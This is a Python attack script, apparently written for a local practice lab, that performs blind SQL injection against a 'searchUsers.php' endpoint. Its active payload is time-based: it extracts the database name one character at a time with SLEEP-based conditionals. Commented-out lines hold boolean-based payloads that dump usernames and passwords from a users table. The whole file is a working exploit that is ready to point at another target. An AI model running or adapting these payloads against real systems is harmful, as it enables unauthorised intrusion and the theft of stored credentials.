#!/usr/bin/python3

import requests
import signal
import sys
import time
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


# ctrl + c
signal.signal(signal.SIGINT, def_handler)

# global variables
main_url="http://localhost/searchUsers.php"

def makeSQLI():
    #  print("\n [+] I dont make mistakes\n")
    # sys.exit(0)
    #
    p1 = log.progress("Fuerza bruta")
    p1.status("INiciando proceso de fuerza bruta")

    time.sleep(3)

    p2 = log.progress("Datos extraidos")
    extracted_info = ""

    for position in range(1, 150):
        for character in range(33, 126):
            # sqli_URL = main_url + "?id=9 or (select (select ascii(substring(username,%d,1)) from users where id = 1)=%d)" % (position, character)
            # print(sqli_URL)
            # sqli_URL = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
            # sqli_URL = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
            sqli_URL = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.6),1)" % (position, character)

            p1.status(sqli_URL)
            time_start = time.time() # timer
            r = requests.get(sqli_URL)
            time_end = time.time() # timer

            # print(r.status_code)
            """
            if r.status_code == 200:
                # print(chr(character))
                extracted_info += chr(character)
                p2.status(extracted_info)
                break
            """
            
            if time_end - time_start > 0.6:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':
    # time.sleep(12)
    makeSQLI()
